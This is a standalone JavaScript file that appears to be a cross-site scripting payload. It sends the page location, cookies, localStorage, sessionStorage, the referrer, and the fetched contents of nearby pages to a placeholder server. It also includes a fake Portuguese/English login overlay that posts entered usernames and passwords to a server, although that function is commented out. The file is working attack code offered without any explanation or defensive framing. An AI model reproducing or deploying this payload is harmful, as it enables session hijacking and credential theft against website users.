const server = 'https://myserverhere/'

const send = async (value) => {
    fetch(server, {
        mode: 'no-cors',
        method: 'post',
        body: value
    })
}

const sendPage = async (url) => {
    let r = await fetch(url, { mode: 'no-cors'})
    let response = await r.text()
    if (response) {
        send(url + '\n' + response)
    }
}

const getSubUrls = (url) => {
    const subUrls = []
    let processing = true
    while (processing) {
        m = url.match('^(.*)/')
        if (m && m.length > 1) {
            url = m[1]
            if (url.length > 9) {
                subUrls.push(url)
            } else {
                url = ''
            }
        } else {
            processing = false
        }   
    }
    return subUrls
}

const sendStorage = () => {
    let localValues = '';
    let keys = Object.keys(localStorage);
    for (let i = keys.length-1; i >= 0; i--) {
        localValues += keys[i] + '::' + localStorage.getItem(keys[i]) + '<<>>';
    }
    if (localValues.length > 0) {
        send('localStorage\n'+localValues);
    }

    let sessionValues = '';
    keys = Object.keys(sessionStorage);
    for (let i = keys.length-1; i >= 0; i--) {
        sessionValues += keys[i] + '::' + sessionStorage.getItem(keys[i]) + '<<>>';
    }
    if (sessionValues.length > 0) {
        send('sessionStorage\n'+sessionValues);
    }
}


send('location\n' + document.location)

if (document.cookie.length > 0) {
    send('cookies\n' + document.cookie)
}

sendStorage();

if (document.referrer) {
    send('referrer\n' + document.referrer)
    sendPage(document.referrer)
    const referrerUrls = getSubUrls(document.referrer)
    referrerUrls.forEach(url => sendPage(url))
}

sendPage(window.location.href)
const locationUrls = getSubUrls(window.location.href)
locationUrls.forEach(url => sendPage(url))

// sendPage('http://vitima.com')



const displayAutenticationPage = (language = 'pt') => {
    let words = []
    if (language.toLowerCase() == 'pt') {
        words = [
            'senha',
            'credenciais incorretas, tente novamente!'
        ]
    } else {
        words = [
            'password',
            'incorrect credentials, try again!'
        ]
    }
    const div = document.createElement("div"); 
    div.innerHTML = `
    <div style="width: 100%;height: 100%;background-color: #eee;position: absolute;left: 0;top: 0;">
        <div class="login-page" style="width: 360px;padding: 8% 0 0;margin: auto;">
            <div class="form" style="position: relative;z-index: 1;background: #FFFFFF;max-width: 360px;margin: 0 auto 100px;padding: 45px;text-align: center;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);">
                <div id="login-form">
                    <input id="login" type="text" placeholder="login" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
                    <input id="password" type="password" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
                    <button id="button">login</button>
                    <h5 id="msg" style="visibility: hidden;"> ${words[1]} </h5>
                </form>
            </div>
        </div>
    </div>
    `
    document.getElementsByTagName('html')[0].appendChild(div);
    document.getElementById('button').onclick = () => {
        fetch(receiverServer, {
            method: 'post',
            body: 'login=' + document.getElementById('login').value + '&password=' + document.getElementById('password').value
        });
        document.getElementById('login').value = '';
        document.getElementById('password').value = '';
        document.getElementById('msg').style.visibility = 'visible';
    }
}
// displayAutenticationPage()
